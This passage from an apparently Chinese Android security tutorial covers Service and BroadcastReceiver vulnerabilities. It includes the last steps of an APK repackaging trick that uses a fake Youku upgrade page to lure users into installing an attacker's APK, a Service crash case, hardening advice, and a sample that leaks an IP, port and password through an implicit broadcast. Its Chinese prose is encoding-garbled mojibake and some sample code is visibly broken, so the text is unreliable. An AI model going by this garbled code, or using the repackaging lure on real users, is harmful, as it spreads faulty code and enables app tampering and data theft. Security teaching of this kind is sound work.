ï¼Œä»ä¸­æå–å‡ºPushMsg.smaliï¼›<br>3.åç¼–è¯‘ä¸Šè¿°åˆ›å»ºçš„APKæ–‡ä»¶ï¼Œå°†åŸPushMsgç±»çš„smaliæ–‡ä»¶æ›¿æ¢ä¸ºä¼˜é…·ä¸­çš„PushMsg.smaliæ–‡ä»¶ï¼Œé‡æ–°æ‰“åŒ…ç­¾åï¼›<br>4.å®‰è£…å¹¶è¿è¡Œé‡æ‰“åŒ…åçš„APKï¼Œä¼šçœ‹åˆ°ä¼˜é…·çš„å‡çº§é¡µé¢è§¦å‘ï¼Œå¦‚æœè®¾è®¡çš„å¥½çš„è¯ï¼Œæ˜¯å¯ä»¥è¯±å¯¼ç”¨æˆ·å®‰è£…æ”»å‡»è€…æŒ‡å®šçš„APKæ–‡ä»¶çš„ã€‚</p><h4 id="æ‹’æ¥æœåŠ¡æ”»å‡»"><strong>æ‹’æ¥æœåŠ¡æ”»å‡»</strong></h4><p><strong>åŸç†ä»‹ç»</strong></p><p>Serviceçš„æ‹’ç»æœåŠ¡ä¸»è¦æºäºServiceå¯åŠ¨æ—¶å¯¹æ¥æ”¶çš„Intentç­‰æ²¡æœ‰åšå¼‚å¸¸å¤„ç†æƒ…å†µä¸‹ï¼Œå¯¼è‡´å´©æºƒï¼Œä¸»è¦ä½“ç°åœ¨ç»™Serviceä¼ è¾“çš„intentæˆ–è€…ä¼ è¾“åºåˆ—åŒ–å¯¹è±¡å¯¼è‡´æ¥æ”¶æ—¶å€™çš„ç±»å‹ä¼ åŒ–å¼‚å¸¸ã€‚</p><p><strong>æ¼æ´å¤ç°</strong></p><p><a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048028"><strong>é›ªçƒæœ€æ–°Androidå®¢æˆ·ç«¯å­˜åœ¨ç©ºæŒ‡é’ˆå¼‚å¸¸åŠä¿¡æ¯æ³„éœ²æ¼æ´</strong></a></p><p>adb shell ä¸‹æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œè™šæ‹Ÿæœºå°†å´©æºƒã€‚æ„¿æ„åœ¨äºç©ºæŒ‡é’ˆè°ƒç”¨</p><p><img src="/posts/f416437f.htm/905443_N58T5GMF5RW6URH.png" alt="image-20210908160946499"></p><h4 id="Serviceçš„å®‰å…¨é˜²æŠ¤">Serviceçš„å®‰å…¨é˜²æŠ¤</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">å®‰å…¨é˜²æŠ¤ï¼š</span><br><span class="line">    ï¼ˆ<span class="number">1</span>ï¼‰ç§æœ‰serviceä¸å®šä¹‰<span class="built_in">int</span>ent-filterå¹¶ä¸”è®¾ç½®exportedä¸º<span class="literal">false</span></span><br><span class="line">    ï¼ˆ<span class="number">2</span>ï¼‰å…¬å¼€çš„serviceè®¾ç½®exportedä¸º<span class="literal">true</span>ï¼Œ<span class="built_in">int</span>ent-filterå¯ä»¥å®šä¹‰æˆ–è€…ä¸å®šä¹‰</span><br><span class="line">    ï¼ˆ<span class="number">3</span>ï¼‰åˆä½œserviceéœ€å¯¹åˆä½œæ–¹çš„appç­¾ååšæ ¡éªŒ</span><br><span class="line">    ï¼ˆ<span class="number">4</span>ï¼‰åªè¢«åº”ç”¨æœ¬èº«ä½¿ç”¨çš„serviceåº”è®¾ç½®ä¸ºç§æœ‰</span><br><span class="line">    ï¼ˆ<span class="number">5</span>ï¼‰serviceæ¥æ”¶çš„æ•°æ®éœ€è¦è°¨æ…å¤„ç†</span><br><span class="line">    ï¼ˆ<span class="number">6</span>ï¼‰å†…éƒ¨serviceéœ€è¦ä½¿ç”¨ç­¾åçº§åˆ«çš„protectionLevelæ¥åˆ¤æ–­æ˜¯å¦ä¸ºå†…éƒ¨åº”ç”¨è°ƒç”¨</span><br><span class="line">    ï¼ˆ<span class="number">7</span>ï¼‰ä¸åº”åœ¨serviceåˆ›å»ºï¼ˆonCreateæ–¹æ³•è¢«è°ƒç”¨ï¼‰çš„æ—¶å€™å†³å®šæ˜¯å¦æä¾›æœåŠ¡ï¼Œåº”åœ¨onStartCommand/onBind/onHandleIntentç­‰æ–¹æ³•è¢«è°ƒç”¨æ—¶åšåˆ¤æ–­</span><br><span class="line">    ï¼ˆ<span class="number">8</span>ï¼‰å½“serviceåˆè¿”å›æ•°æ®çš„æ—¶å€™ï¼Œå› åˆ¤æ–­æ•°æ®æ¥æ”¶appæ˜¯å¦åˆä¿¡æ¯æ³„éœ²çš„é£é™©</span><br><span class="line">    ï¼ˆ<span class="number">9</span>ï¼‰æœ‰æ˜ç¡®çš„æœåŠ¡éœ€è°ƒç”¨æ—¶ä½¿ç”¨æ˜¾ç¤ºæ„å›¾</span><br><span class="line">    ï¼ˆ<span class="number">10</span>ï¼‰å°½é‡ä¸å‘é€æ•æ„Ÿä¿¡æ¯</span><br><span class="line">    ï¼ˆ<span class="number">11</span>ï¼‰å¯åŠ¨Activityæ—¶ä¸è®¾ç½®<span class="built_in">int</span>entçš„FLAG_ACTIVITY_NEW_TASKæ ‡ç­¾</span><br></pre></td></tr></table></figure><h2 id="BroadcastReceiverç›¸å…³æ¼æ´">BroadcastReceiverç›¸å…³æ¼æ´</h2><h3 id="è‡ªå®šä¹‰å¹¿æ’­æ¥æ”¶è€…BroadcastReceiver">è‡ªå®šä¹‰å¹¿æ’­æ¥æ”¶è€…BroadcastReceiver</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç»§æ‰¿BroadcastReceivreç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">mBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¤å†™onReceive()æ–¹æ³•</span></span><br><span class="line">  <span class="comment">// æ¥æ”¶åˆ°å¹¿æ’­åï¼Œåˆ™è‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">   <span class="comment">//å†™å…¥æ¥æ”¶å¹¿æ’­åçš„æ“ä½œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">æ“ä½œæ­¥éª¤ï¼š</span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰ç»§æ‰¿BroadcastReceivreåŸºç±»</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰å¿…é¡»å¤å†™æŠ½è±¡æ–¹æ³•onReceive()æ–¹æ³•</span><br><span class="line">    å¹¿æ’­æ¥æ”¶å™¨æ¥æ”¶åˆ°ç›¸åº”å¹¿æ’­åï¼Œä¼šè‡ªåŠ¨å›è°ƒ onReceive() æ–¹æ³•ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒonReceiveæ–¹æ³•ä¼šæ¶‰åŠ ä¸ å…¶ä»–ç»„ä»¶ä¹‹é—´çš„äº¤äº’ï¼Œå¦‚å‘é€Notificationã€å¯åŠ¨Serviceç­‰ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå¹¿æ’­æ¥æ”¶å™¨è¿è¡Œåœ¨ UI çº¿ç¨‹ï¼Œå› æ­¤ï¼ŒonReceive()æ–¹æ³•ä¸èƒ½æ‰§è¡Œè€—æ—¶æ“ä½œï¼Œå¦åˆ™å°†å¯¼è‡´ANR</span><br></pre></td></tr></table></figure><h3 id="å¹¿æ’­æ¥æ”¶è€…æ³¨å†Œ"><strong>å¹¿æ’­æ¥æ”¶è€…æ³¨å†Œ</strong></h3><p>æ³¨å†Œçš„ä¸¤ç§æ–¹å¼ï¼šé™æ€æ³¨å†Œï¼ŒåŠ¨æ€æ³¨å†Œ</p><p><strong>é™æ€æ³¨å†Œ</strong></p><p>åœ¨AndroidManifest.xmlé‡Œé€šè¿‡<receive>æ ‡ç­¾å£°æ˜</receive></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    //<span class="attr">æ­¤å¹¿æ’­æ¥æ”¶è€…ç±»æ˜¯mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //ç”¨äºæ¥æ”¶ç½‘ç»œçŠ¶æ€æ”¹å˜æ—¶å‘å‡ºçš„å¹¿æ’­</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>åŠ¨æ€æ³¨å†Œ</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">I <span class="type">ntentFilter</span> <span class="variable">intentFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">intentFilter</span>();</span><br><span class="line">intentFilter.addAction(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">registerReceiver(<span class="string">&quot;networkChangeReceiver&quot;</span>,intentFilter);</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onPause</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.onPause;</span><br><span class="line">    unregisterReceive(networkChangeReceiver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">networkChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">        Toast.makeText(context,<span class="string">&quot;network changes&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰å®ä¾‹åŒ–è‡ªå®šä¹‰çš„å¹¿æ’­æ¥æ”¶è€…ï¼Œæˆ‘ä»¬å®ç°å¹¿æ’­çš„åŠŸèƒ½ï¼Œå¯ä»¥ç»§æ‰¿BroadcastReceiverç±»ï¼Œå¹¶é‡å†™ç±»ä¸­çš„æ–¹æ³•</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰å®ä¾‹åŒ–æ„å›¾è¿‡æ»¤å™¨ï¼Œå¹¶è®¾ç½®è¦è¿‡æ»¤çš„å¹¿æ’­ç±»å‹</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰ä½¿ç”¨Contextçš„<span class="built_in">registerReceiver</span>(BroadcastReceiver,IntentFilter)æ–¹æ³•æ³¨å†Œå¹¿æ’­</span><br><span class="line">ï¼ˆ<span class="number">4</span>ï¼‰åœ¨<span class="built_in">onDestory</span>()æ–¹æ³•ä¸­é€šè¿‡è°ƒç”¨<span class="built_in">unregisterReceiver</span>()æ–¹æ³•æ¥å®ç°å–æ¶ˆæ³¨å†Œ</span><br></pre></td></tr></table></figure><h3 id="å¹¿æ’­çš„ç±»å‹">å¹¿æ’­çš„ç±»å‹</h3><h4 id="æ™®é€šå¹¿æ’­">æ™®é€šå¹¿æ’­</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="comment">//å¯¹åº”BroadcastReceiverä¸­intentFilterçš„action</span></span><br><span class="line">intent.setAction(<span class="string">&quot;BROADCAST_ACTION&quot;</span>);</span><br><span class="line"><span class="comment">//å‘é€å¹¿æ’­</span></span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>è‹¥è¢«æ³¨å†Œäº†çš„å¹¿æ’­æ¥æ”¶è€…ä¸­æ³¨å†Œæ—¶intentFilterçš„actionä¸ä¸Šè¿°åŒ¹é…ï¼Œåˆ™ä¼šæ¥æ”¶æ­¤å¹¿æ’­ï¼ˆå³è¿›è¡Œå›è°ƒonReceive()ï¼‰,å¦‚ä¸‹mBroadcastReceiveråˆ™ä¼šæ¥æ”¶ä¸Šè¿°å¹¿æ’­</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    //<span class="attr">æ­¤å¹¿æ’­æ¥æ”¶è€…ç±»æ˜¯mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //ç”¨äºæ¥æ”¶ç½‘ç»œçŠ¶æ€æ”¹å˜æ—¶å‘å‡ºçš„å¹¿æ’­</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;BROADCAST_ACTION&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœå‘é€çš„å¹¿æ’­æœ‰å¯¹åº”æƒé™ï¼Œé‚£ä¹ˆå¹¿æ’­æ¥æ”¶è€…ä¹Ÿéœ€è¦å¯¹åº”æƒé™</p><h4 id="ç³»ç»Ÿå¹¿æ’­ï¼š"><strong>ç³»ç»Ÿå¹¿æ’­ï¼š</strong></h4><p>Androidä¸­å†…ç½®äº†å¤šä¸ªç³»ç»Ÿå¹¿æ’­ï¼šåªè¦æ¶‰åŠåˆ°æ‰‹æœºçš„åŸºæœ¬æ“ä½œï¼ˆå¦‚å¼€æœºã€ç½‘ç»œçŠ¶æ€å˜åŒ–ã€æ‹ç…§ç­‰ï¼‰ï¼Œéƒ½ä¼šå‘é€ç›¸åº”çš„å¹¿æ’­æ¯ä¸ªå¹¿æ’­éƒ½æœ‰ç‰¹å®šçš„Intent-Filter(åŒ…æ‹¬å…·ä½“çš„action)ï¼ŒAndroidç³»ç»Ÿå¹¿æ’­actionå¦‚ä¸‹ï¼š</p><h4 id="æœ‰åºå¹¿æ’­">æœ‰åºå¹¿æ’­</h4><p>å‘é€å‡ºå»çš„å¹¿æ’­è¢«å¹¿æ’­æ¥æ”¶è€…æŒ‰ç…§å…ˆåé¡ºåºæ¥æ”¶ æœ‰åºæ˜¯é’ˆå¯¹å¹¿æ’­æ¥æ”¶è€…è€Œè¨€çš„ã€‚å¹¿æ’­æ¥æ”¶è€…æ¥æ”¶å¹¿æ’­çš„é¡ºåºè§„åˆ™ï¼ˆåŒæ—¶é¢å‘é™æ€å’ŒåŠ¨æ€æ³¨å†Œçš„å¹¿æ’­æ¥æ”¶è€…ï¼‰ï¼š</p><p>ï¼ˆ1ï¼‰æŒ‰ç…§Priorityå±æ€§å€¼ä»å¤§-å°æ’åº<br>ï¼ˆ2ï¼‰Priorityå±æ€§ç›¸åŒè€…ï¼ŒåŠ¨æ€æ³¨å†Œçš„å¹¿æ’­ä¼˜å…ˆ</p><p><strong>ç‰¹ç‚¹</strong></p><p>ï¼ˆ1ï¼‰æ¥æ”¶å¹¿æ’­æŒ‰é¡ºåºæ¥æ”¶<br>ï¼ˆ2ï¼‰å…ˆæ¥æ”¶çš„å¹¿æ’­æ¥æ”¶è€…å¯ä»¥å¯¹å¹¿æ’­è¿›è¡Œæˆªæ–­ï¼Œå³åæ¥æ”¶çš„å¹¿æ’­æ¥æ”¶è€…ä¸åœ¨æ¥æ”¶æ­¤å¹¿æ’­ï¼Œå¯ä»¥ä½¿ç”¨abortBroadcast()æ–¹æ³•<br>ï¼ˆ3ï¼‰å…ˆæ¥æ”¶çš„å¹¿æ’­æ¥æ”¶è€…å¯ä»¥å¯¹å¹¿æ’­è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆåæ¥æ”¶çš„å¹¿æ’­æ¥æ”¶è€…å°†æ¥æ”¶åˆ°è¢«ä¿®æ”¹åçš„å¹¿æ’­</p><p>å…·ä½“ä½¿ç”¨ï¼šæœ‰åºå¹¿æ’­çš„ä½¿ç”¨è¿‡ç¨‹ä¸æ™®é€šå¹¿æ’­éå¸¸ç±»ä¼¼ï¼Œå·®å¼‚ä»…åœ¨äºå¹¿æ’­çš„å‘é€æ–¹å¼</p><p><code>sendOrderedBroadcast(intent,null); //å‚æ•°1ï¼šæ¥æ”¶çš„Intent å‚æ•°2ï¼šä¸æƒé™ç›¸å…³å­—ç¬¦ä¸²ï¼Œä¸€èˆ¬ä¸ºnull</code></p><h4 id="æœ¬åœ°å¹¿æ’­">æœ¬åœ°å¹¿æ’­</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ç”±äºAndroidä¸­çš„å¹¿æ’­å¯ä»¥è·¨<span class="keyword">App</span>ç›´æ¥é€šä¿¡ï¼ˆexportedå¯¹äºæœ‰intent-filteræƒ…å†µä¸‹é»˜è®¤å€¼ä¸ºtrueï¼‰</span><br><span class="line">å¯¼è‡´å¯èƒ½ä¼šå‡ºç°çš„é—®é¢˜ï¼š</span><br><span class="line">    ï¼ˆ1ï¼‰å…¶ä»–<span class="keyword">App</span>é’ˆå¯¹æ€§å‘å‡ºä¸å½“å‰<span class="keyword">App</span> intent-filterç›¸åŒ¹é…çš„å¹¿æ’­ï¼Œç”±æ­¤å¯¼è‡´å½“å‰<span class="keyword">App</span>ä¸æ–­æ¥æ”¶å¹¿æ’­å¹¶å¤„ç†</span><br><span class="line">    ï¼ˆ2ï¼‰å…¶ä»–<span class="keyword">App</span>æ³¨å†Œä¸å½“å‰<span class="keyword">App</span>ä¸€è‡´çš„intent-filterç”¨äºæ¥æ”¶å¹¿æ’­ï¼Œè·å–å¹¿æ’­çš„å…·ä½“æ˜Ÿç³»ï¼Œä¼šå‡ºç°å®‰å…¨æ€§å’Œæ•ˆç‡æ€§é—®é¢˜</span><br><span class="line">è§£å†³æ–¹æ¡ˆï¼š</span><br><span class="line">ä½¿ç”¨<span class="keyword">App</span>åº”ç”¨å†…å¹¿æ’­ï¼ˆ<span class="keyword">Local</span> Broadcastï¼‰</span><br><span class="line">    (1)<span class="keyword">App</span>åº”ç”¨å†…å¹¿æ’­å¯ç†è§£ä¸ºä¸€ç§å±€éƒ¨å¹¿æ’­ï¼Œå¹¿æ’­çš„å‘é€è€…å’Œæ¥æ”¶è€…éƒ½åŒå±äºä¸€ä¸ª<span class="keyword">App</span></span><br><span class="line">    (2)ç›¸æ¯”äºå…¨å±€å¹¿æ’­ï¼ˆæ™®é€šå¹¿æ’­ï¼‰ï¼Œ<span class="keyword">App</span>åº”ç”¨å†…å¹¿æ’­ä¼˜åŠ¿ä½“ç°åœ¨ï¼šå®‰å…¨æ€§é«˜å’Œæ•ˆç‡é«˜</span><br></pre></td></tr></table></figure><p><strong>å®ç°æ­¥éª¤</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³•<span class="number">1</span>ï¼š</span><br><span class="line">å°†å…¨å±€å¹¿æ’­è®¾ç½®ä¸ºå±€éƒ¨å¹¿æ’­</span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰æ³¨å†Œå¹¿æ’­æ˜¯å°†exportedå±æ€§è®¾ç½®ä¸º<span class="literal">false</span>ï¼Œä½¿å¾—éæœ¬Appå†…éƒ¨å‘å‡ºçš„æ­¤å¹¿æ’­ä¸è¢«æ¥æ”¶</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰åœ¨å¹¿æ’­çš„å‘é€å’Œæ¥æ”¶æ—¶ï¼Œå¢è®¾ç›¸åº”æƒé™permissionï¼Œç”¨äºæƒé™éªŒè¯</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰å‘é€å¹¿æ’­æ—¶æŒ‡å®šè¯¥å¹¿æ’­æ¥æ”¶å™¨æ‰€åœ¨çš„åŒ…åï¼Œæ­¤å¹¿æ’­å°†åªä¼šå‘é€åˆ°æ­¤åŒ…ä¸­çš„Appå†…ä¸ä¹‹ç›¸åŒ¹é…çš„æœ‰æ•ˆå¹¿æ’­æ¥æ”¶å™¨ä¸­</span><br><span class="line">é€šè¿‡<span class="built_in">int</span>ent.setPackage(packageName)æŒ‡å®šåŒ…å</span><br><span class="line"> </span><br><span class="line">æ–¹æ³•<span class="number">2</span>ï¼š</span><br><span class="line">    ä½¿ç”¨å°è£…å¥½çš„LocalBroadcastManagerç±»ä½¿ç”¨æ–¹å¼ä¸Šä¸å…¨å±€å¹¿æ’­å‡ ä¹ç›¸åŒï¼Œåªæ˜¯æ³¨å†Œ/å–æ¶ˆæ³¨å†Œå¹¿æ’­æ¥æ”¶å™¨å’Œå‘é€å¹¿æ’­æ—¶å°†å‚æ•°contextå˜æˆLocalBroadcastManagerçš„å•ä¸€å®ä¾‹ã€‚</span><br><span class="line">æ³¨æ„ï¼šå¯¹äºLocalBroadcastManageræ–¹å¼å‘é€çš„åº”ç”¨å†…å¹¿æ’­ï¼Œåªèƒ½é€šè¿‡LocalBroadcastManageråŠ¨æ€æ³¨å†Œï¼Œä¸èƒ½é™æ€æ³¨å†Œ</span><br></pre></td></tr></table></figure><p>æ–¹æ³•äºŒçš„å…·ä½“å®ç°ï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ³¨å†Œåº”ç”¨å†…å¹¿æ’­æ¥æ”¶å™¨</span></span><br><span class="line"><span class="comment">//æ­¥éª¤1ï¼šå®ä¾‹åŒ–BroadcastReceiverå­ç±» &amp; IntentFilter mBroadcastReceiver</span></span><br><span class="line">mBroadcastReceiver = new mBroadcastReceiver();</span><br><span class="line">IntentFilter <span class="built_in">int</span>entFilter = new IntentFilter();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ­¥éª¤2ï¼šå®ä¾‹åŒ–LocalBroadcastManagerçš„å®ä¾‹</span></span><br><span class="line">localBroadcastManager = LocalBroadcastManager.getInstance(<span class="keyword">this</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ­¥éª¤3ï¼šè®¾ç½®æ¥æ”¶å¹¿æ’­çš„ç±»å‹</span></span><br><span class="line"><span class="built_in">int</span>entFilter.addAction(android.net.conn.CONNECTIVITY_CHANGE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//æ­¥éª¤4ï¼šè°ƒç”¨LocalBroadcastManagerå•ä¸€å®ä¾‹çš„registerReceiverï¼ˆï¼‰æ–¹æ³•è¿›è¡ŒåŠ¨æ€æ³¨å†Œ</span></span><br><span class="line">localBroadcastManager.registerReceiver(mBroadcastReceiver, <span class="built_in">int</span>entFilter);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å–æ¶ˆæ³¨å†Œåº”ç”¨å†…å¹¿æ’­æ¥æ”¶å™¨</span></span><br><span class="line">localBroadcastManager.unregisterReceiver(mBroadcastReceiver);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//å‘é€åº”ç”¨å†…å¹¿æ’­</span></span><br><span class="line">Intent <span class="built_in">int</span>ent = new Intent();</span><br><span class="line"><span class="built_in">int</span>ent.setAction(BROADCAST_ACTION);</span><br><span class="line">localBroadcastManager.sendBroadcast(<span class="built_in">int</span>ent);</span><br></pre></td></tr></table></figure><h3 id="BroadcastReceiveræ¼æ´åŸç†åˆ†æ">BroadcastReceiveræ¼æ´åŸç†åˆ†æ</h3><p><strong>æ¼æ´ç§ç±»</strong></p><ul><li>æ•æ„Ÿä¿¡æ¯æ³„éœ²</li><li>æƒé™ç»•è¿‡</li><li>æ¶ˆæ¯ä¼ªé€ </li><li>æ‹’ç»æœåŠ¡</li></ul><h4 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²">æ•æ„Ÿä¿¡æ¯æ³„éœ²</h4><p><strong>åŸç†ä»‹ç»</strong>ï¼š</p><p>å‘é€çš„intentæ²¡æœ‰æ˜ç¡®æŒ‡å®šæ¥å—è€…ï¼Œè€Œæ˜¯ç®€å•çš„é€šè¿‡actionè¿›è¡ŒåŒ¹é…ï¼Œæ¶æ„åº”ç”¨ä¾¿å¯ä»¥æ³¨å†Œä¸€ä¸ªå¹¿æ’­æ¥æ”¶è€…å—…æ¢æ‹¦æˆªåˆ°è¿™ä¸ªå¹¿æ’­ï¼Œå¦‚æœè¿™ä¸ªå¹¿æ’­å­˜åœ¨æ•æ„Ÿæ•°æ®ï¼Œå°±è¢«æ¶æ„åº”ç”¨çªƒå–äº†ã€‚</p><p><strong>æ¼æ´å¤ç°</strong></p><p>æ¡ˆä¾‹1</p><p>ç›®æ ‡ç¨‹åºæ®µä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">d</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    v1.setAction(<span class="string">&quot;com.sample.action.server_running&quot;</span>);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;local_ip&quot;</span>,v0.h);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;port&quot;</span>,v0.i);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;code&quot;</span>,v0.g);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;connected&quot;</span>,v0.s);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;pwd_predefined&quot;</span>,v0.r);</span><br><span class="line">    <span class="keyword">if</span>(!TextUtils.isEmpty(v0.t))&#123;</span><br><span class="line">        v1.putExtra(<span class="string">&quot;connected_usr&quot;</span>,v0.t);</span><br><span class="line">    &#125;</span><br><span class="line">    sendBroadcast(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡intentéšå¼ä¼ é€’æ•°æ®ï¼Œæ‰€ä»¥ç¼–å†™ä¸€ä¸ªæ¥å—è€…ä»£ç ï¼Œå“åº”actionç„¶åè·å–æ•æ„Ÿæ•°æ®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 